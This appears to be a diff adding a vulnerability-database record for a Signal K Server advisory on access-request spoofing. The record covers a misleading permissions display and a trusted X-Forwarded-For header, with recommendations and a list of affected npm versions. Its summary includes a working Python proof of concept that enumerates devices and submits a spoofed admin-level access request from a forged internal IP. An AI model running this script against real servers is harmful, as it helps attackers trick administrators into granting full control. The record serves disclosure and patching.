@@ -1,0 +1,283 @@
+advisory_id: GHSA-vfrf-vcj7-wvr8
+datasource_id: github_osv/GHSA-vfrf-vcj7-wvr8
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-vfrf-vcj7-wvr8/GHSA-vfrf-vcj7-wvr8.json
+aliases:
+  - CVE-2025-69203
+summary: "Signal K Server Vulnerable to Access Request Spoofing\nThe SignalK access request\
+  \ system has two related features that when combined by themselves and with the infromation\
+  \ disclosure vulnerability enable convincing social engineering attacks against administrators.\n\
+  \nWhen a device creates an access request, it specifies three fields: `clientId`, `description`,\
+  \ and `permissions`. The SignalK admin UI displays the `description` field prominently to\
+  \ the administrator when showing pending requests, but the actual `permissions` field (which\
+  \ determines the access level granted) is less visible or displayed separately. This allows\
+  \ an attacker to request `admin` permissions while providing a description that suggests readonly\
+  \ access.\n\nThe access request handler trusts the `X-Forwarded-For` HTTP header without validation\
+  \ to determine the client's IP address. This header is intended to preserve the original client\
+  \ IP when requests pass through reverse proxies, but when trusted unconditionally, it allows\
+  \ attackers to spoof their IP address. The spoofed IP is displayed to administrators in the\
+  \ access request approval interface, potentially making malicious requests appear to originate\
+  \ from trusted internal network addresses.\n\nSince device/source names can be enumerated\
+  \ via the information disclosure vulnerability, an attacker can impersonate a legitimate device\
+  \ or source, craft a convincing description, spoof a trusted internal IP address, and request\
+  \ elevated permissions, creating a highly convincing social engineering scenario that increases\
+  \ the likelihood of administrator approval.\n\n### Affected Code\n\n**File**: `packages/server-admin-ui/src/views/security/AccessRequests.js`\n\
+  \nThe admin UI renders access requests showing the description field prominently. The permissions\
+  \ field is displayed but may not be as visually prominent, leading administrators to approve\
+  \ based on the description text.\n\n**File**: `src/tokensecurity.js` (access request creation\
+  \ and IP extraction)\n\n```javascript\n// Access request accepts any permissions value from\
+  \ the client\nconst permissions = req.body.permissions  // No validation against description\n\
+  \n// IP address extraction trusts X-Forwarded-For without validation\nconst ip = req.headers['x-forwarded-for']\
+  \ || req.connection.remoteAddress\n```\n\nThe code prioritizes the `X-Forwarded-For` header\
+  \ over the actual connection IP, allowing client-controlled spoofing.\n\n### Impact\n\nAn\
+  \ administrator who trusts device descriptions and IP addresses may inadvertently grant admin\
+  \ privileges to an attacker. The combination of spoofed device name, misleading description,\
+  \ and trusted internal IP address creates a highly convincing social engineering attack. Combined\
+  \ with the token theft vulnerability, this provides a complete authentication bypass requiring\
+  \ only one click from the admin.\n\n### PoC\n\n```python\nimport requests\n\nTARGET = \"http://localhost:3000\"\
+  \nSPOOFED_IP = \"192.168.1.100\"\n\ndef create_spoofed_request(device_name):\n    payload\
+  \ = {\n        \"clientId\": device_name,\n        \"description\": f\"{device_name} - Read\
+  \ Only\",  # Misleading\n        \"permissions\": \"admin\"  # Actually requesting admin!\n\
+  \    }\n    \n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"\
+  X-Forwarded-For\": SPOOFED_IP  # Spoof internal IP\n    }\n    \n    r = requests.post(\n\
+  \        f\"{TARGET}/signalk/v1/access/requests\",\n        json=payload,\n        headers=headers\n\
+  \    )\n    \n    if r.status_code == 202:\n        data = r.json()\n        href = data.get(\"\
+  href\")\n        request_id = href.split(\"/\")[-1] if href else None\n        \n        print(f\"\
+  [+] Access request created!\")\n        print(f\"[+] Request ID: {request_id}\")\n       \
+  \ print(f\"[+] Admin sees: '{payload['description']}'\")\n        print(f\"[+] Actual permissions:\
+  \ {payload['permissions']}\")\n        print(f\"[+] Spoofed IP: {SPOOFED_IP}\")\n        \n\
+  \        return request_id\n    else:\n        print(f\"[-] Failed: {r.status_code} - {r.text}\"\
+  )\n        return None\n\nif __name__ == \"__main__\":\n    # First enumerate devices/sources\
+  \ using info disclosure vulnerability\n    sources = requests.get(f\"{TARGET}/signalk/v1/api/sources\"\
+  ).json()\n    devices = [d for d in sources.keys() if d != \"defaults\"]\n    \n    if devices:\n\
+  \        print(f\"[+] Found devices: {devices}\")\n        create_spoofed_request(devices[0])\n\
+  \    else:\n        create_spoofed_request(\"sensor-01\")\n```\n\n### Recommendation\n\n1.\
+  \ Display permissions prominently. The admin UI should prominently display the requested permission\
+  \ level with visual warnings for elevated permissions (readwrite, admin). Consider requiring\
+  \ administrators to explicitly select the permission level during approval rather than accepting\
+  \ the requested value.\n2. Validate X-Forwarded-For headers. Only trust `X-Forwarded-For`\
+  \ headers from configured trusted proxy IP addresses. Implement Express.js trust proxy settings\
+  \ or equivalent. Log both the forwarded IP and the actual connection IP for audit purposes.\n\
+  3. Whitelist device IP addresses. Implement an IP whitelist for access requests, allowing\
+  \ only known device IP addresses to create requests. This prevents external attackers from\
+  \ creating spoofed requests."
+impacted_packages:
+  - purl: pkg:github/signalk/signalk-server
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/signalk/signalk-server
+        commit: 221aff6cd89c56308084d1781b3abbf938605bd3
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:npm/signalk-server
+    affected_versions: vers:npm/<2.19.0
+    fixed_versions: vers:npm/2.19.0
+    affected_packages:
+      - pkg:npm/signalk-server@0.1.24
+      - pkg:npm/signalk-server@0.1.27
+      - pkg:npm/signalk-server@0.1.28
+      - pkg:npm/signalk-server@0.1.29
+      - pkg:npm/signalk-server@0.1.30
+      - pkg:npm/signalk-server@0.1.31
+      - pkg:npm/signalk-server@0.1.32
+      - pkg:npm/signalk-server@1.0.0-0
+      - pkg:npm/signalk-server@1.0.0-1
+      - pkg:npm/signalk-server@1.0.0-2
+      - pkg:npm/signalk-server@1.0.0-3
+      - pkg:npm/signalk-server@1.0.0-4
+      - pkg:npm/signalk-server@1.0.0
+      - pkg:npm/signalk-server@1.1.0
+      - pkg:npm/signalk-server@1.1.1
+      - pkg:npm/signalk-server@1.1.2
+      - pkg:npm/signalk-server@1.2.0
+      - pkg:npm/signalk-server@1.2.1
+      - pkg:npm/signalk-server@1.2.2
+      - pkg:npm/signalk-server@1.2.3
+      - pkg:npm/signalk-server@1.2.4
+      - pkg:npm/signalk-server@1.3.0
+      - pkg:npm/signalk-server@1.4.0
+      - pkg:npm/signalk-server@1.4.1
+      - pkg:npm/signalk-server@1.4.2
+      - pkg:npm/signalk-server@1.4.3
+      - pkg:npm/signalk-server@1.5.0
+      - pkg:npm/signalk-server@1.6.0
+      - pkg:npm/signalk-server@1.7.0
+      - pkg:npm/signalk-server@1.7.1
+      - pkg:npm/signalk-server@1.8.0
+      - pkg:npm/signalk-server@1.9.0
+      - pkg:npm/signalk-server@1.9.1
+      - pkg:npm/signalk-server@1.10.0
+      - pkg:npm/signalk-server@1.10.1
+      - pkg:npm/signalk-server@1.10.2
+      - pkg:npm/signalk-server@1.11.0
+      - pkg:npm/signalk-server@1.12.0
+      - pkg:npm/signalk-server@1.13.0
+      - pkg:npm/signalk-server@1.13.1
+      - pkg:npm/signalk-server@1.14.0
+      - pkg:npm/signalk-server@1.15.0
+      - pkg:npm/signalk-server@1.16.0
+      - pkg:npm/signalk-server@1.17.0
+      - pkg:npm/signalk-server@1.18.0-beta.1
+      - pkg:npm/signalk-server@1.18.0-beta.2
+      - pkg:npm/signalk-server@1.18.0-beta.3
+      - pkg:npm/signalk-server@1.18.0-beta.4
+      - pkg:npm/signalk-server@1.18.0-beta.5
+      - pkg:npm/signalk-server@1.18.0-beta.6
+      - pkg:npm/signalk-server@1.18.0
+      - pkg:npm/signalk-server@1.19.0-beta.1
+      - pkg:npm/signalk-server@1.19.0-beta.2
+      - pkg:npm/signalk-server@1.19.0
+      - pkg:npm/signalk-server@1.20.0
+      - pkg:npm/signalk-server@1.21.0
+      - pkg:npm/signalk-server@1.22.0
+      - pkg:npm/signalk-server@1.23.0
+      - pkg:npm/signalk-server@1.24.0
+      - pkg:npm/signalk-server@1.25.0
+      - pkg:npm/signalk-server@1.26.0
+      - pkg:npm/signalk-server@1.27.0
+      - pkg:npm/signalk-server@1.27.1
+      - pkg:npm/signalk-server@1.28.0-beta.1
+      - pkg:npm/signalk-server@1.28.0
+      - pkg:npm/signalk-server@1.29.0-beta.1
+      - pkg:npm/signalk-server@1.29.0
+      - pkg:npm/signalk-server@1.30.0
+      - pkg:npm/signalk-server@1.31.0
+      - pkg:npm/signalk-server@1.32.0
+      - pkg:npm/signalk-server@1.33.0-beta.1
+      - pkg:npm/signalk-server@1.33.0
+      - pkg:npm/signalk-server@1.34.0
+      - pkg:npm/signalk-server@1.35.0
+      - pkg:npm/signalk-server@1.35.1
+      - pkg:npm/signalk-server@1.35.2
+      - pkg:npm/signalk-server@1.36.0-beta.1
+      - pkg:npm/signalk-server@1.36.0-beta.2
+      - pkg:npm/signalk-server@1.36.0-beta.3
+      - pkg:npm/signalk-server@1.36.0
+      - pkg:npm/signalk-server@1.37.0-beta.1
+      - pkg:npm/signalk-server@1.37.0-beta.3
+      - pkg:npm/signalk-server@1.37.0
+      - pkg:npm/signalk-server@1.37.1
+      - pkg:npm/signalk-server@1.37.2
+      - pkg:npm/signalk-server@1.37.3
+      - pkg:npm/signalk-server@1.37.4
+      - pkg:npm/signalk-server@1.37.5
+      - pkg:npm/signalk-server@1.37.6
+      - pkg:npm/signalk-server@1.38.0
+      - pkg:npm/signalk-server@1.38.1
+      - pkg:npm/signalk-server@1.39.0
+      - pkg:npm/signalk-server@1.40.0
+      - pkg:npm/signalk-server@1.41.0-beta.2
+      - pkg:npm/signalk-server@1.41.0-beta.3
+      - pkg:npm/signalk-server@1.41.0-beta.4
+      - pkg:npm/signalk-server@1.41.0
+      - pkg:npm/signalk-server@1.41.1
+      - pkg:npm/signalk-server@1.41.2
+      - pkg:npm/signalk-server@1.41.3
+      - pkg:npm/signalk-server@1.42.0
+      - pkg:npm/signalk-server@1.43.0
+      - pkg:npm/signalk-server@1.44.0
+      - pkg:npm/signalk-server@1.45.0
+      - pkg:npm/signalk-server@1.46.2
+      - pkg:npm/signalk-server@1.46.3
+      - pkg:npm/signalk-server@2.0.0-beta.1
+      - pkg:npm/signalk-server@2.0.0-beta.2
+      - pkg:npm/signalk-server@2.0.0-beta.5
+      - pkg:npm/signalk-server@2.0.0-beta.6
+      - pkg:npm/signalk-server@2.0.0-beta.7
+      - pkg:npm/signalk-server@2.0.0-beta.9
+      - pkg:npm/signalk-server@2.0.0-beta.11
+      - pkg:npm/signalk-server@2.0.0-beta.12
+      - pkg:npm/signalk-server@2.0.0
+      - pkg:npm/signalk-server@2.1.0
+      - pkg:npm/signalk-server@2.1.1
+      - pkg:npm/signalk-server@2.2.0
+      - pkg:npm/signalk-server@2.3.0-beta.2
+      - pkg:npm/signalk-server@2.3.0-canboatv2.1
+      - pkg:npm/signalk-server@2.3.0
+      - pkg:npm/signalk-server@2.3.1
+      - pkg:npm/signalk-server@2.4.0
+      - pkg:npm/signalk-server@2.4.1
+      - pkg:npm/signalk-server@2.5.0
+      - pkg:npm/signalk-server@2.6.0
+      - pkg:npm/signalk-server@2.6.1
+      - pkg:npm/signalk-server@2.6.2
+      - pkg:npm/signalk-server@2.7.0
+      - pkg:npm/signalk-server@2.7.1
+      - pkg:npm/signalk-server@2.7.2
+      - pkg:npm/signalk-server@2.8.0
+      - pkg:npm/signalk-server@2.8.1
+      - pkg:npm/signalk-server@2.8.2
+      - pkg:npm/signalk-server@2.8.3
+      - pkg:npm/signalk-server@2.9.0
+      - pkg:npm/signalk-server@2.10.0
+      - pkg:npm/signalk-server@2.11.0
+      - pkg:npm/signalk-server@2.12.0
+      - pkg:npm/signalk-server@2.13.0-beta.1
+      - pkg:npm/signalk-server@2.13.0-beta.2
+      - pkg:npm/signalk-server@2.13.0-beta.3
+      - pkg:npm/signalk-server@2.13.0
+      - pkg:npm/signalk-server@2.13.1
+      - pkg:npm/signalk-server@2.13.2
+      - pkg:npm/signalk-server@2.13.3
+      - pkg:npm/signalk-server@2.13.4
+      - pkg:npm/signalk-server@2.13.5
+      - pkg:npm/signalk-server@2.14.0-beta.1
+      - pkg:npm/signalk-server@2.14.0
+      - pkg:npm/signalk-server@2.14.1
+      - pkg:npm/signalk-server@2.14.2
+      - pkg:npm/signalk-server@2.14.3
+      - pkg:npm/signalk-server@2.14.4
+      - pkg:npm/signalk-server@2.15.0-beta.1
+      - pkg:npm/signalk-server@2.15.0-beta.2
+      - pkg:npm/signalk-server@2.15.0-beta.3
+      - pkg:npm/signalk-server@2.15.0-beta.4
+      - pkg:npm/signalk-server@2.15.0-beta.5
+      - pkg:npm/signalk-server@2.15.0-beta.6
+      - pkg:npm/signalk-server@2.15.0
+      - pkg:npm/signalk-server@2.15.1
+      - pkg:npm/signalk-server@2.15.2
+      - pkg:npm/signalk-server@2.15.3
+      - pkg:npm/signalk-server@2.16.0
+      - pkg:npm/signalk-server@2.17.0
+      - pkg:npm/signalk-server@2.17.2
+      - pkg:npm/signalk-server@2.18.0
+      - pkg:npm/signalk-server@2.19.0-beta.1
+      - pkg:npm/signalk-server@2.19.0-beta.2
+      - pkg:npm/signalk-server@2.19.0-beta.4
+      - pkg:npm/signalk-server@2.19.0-beta.5
+    fixed_packages:
+      - pkg:npm/signalk-server@2.19.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '6.3'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-vfrf-vcj7-wvr8/GHSA-vfrf-vcj7-wvr8.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-290
+references:
+  - url: https://github.com/SignalK/signalk-server
+    reference_type:
+    reference_id:
+  - url: https://github.com/SignalK/signalk-server/commit/221aff6cd89c56308084d1781b3abbf938605bd3
+    reference_type:
+    reference_id:
+  - url: https://github.com/SignalK/signalk-server/releases/tag/v2.19.0
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-69203
+    reference_type:
+    reference_id: CVE-2025-69203
+  - url: https://github.com/SignalK/signalk-server/security/advisories/GHSA-vfrf-vcj7-wvr8
+    reference_type:
+    reference_id: GHSA-vfrf-vcj7-wvr8
+exploits: []
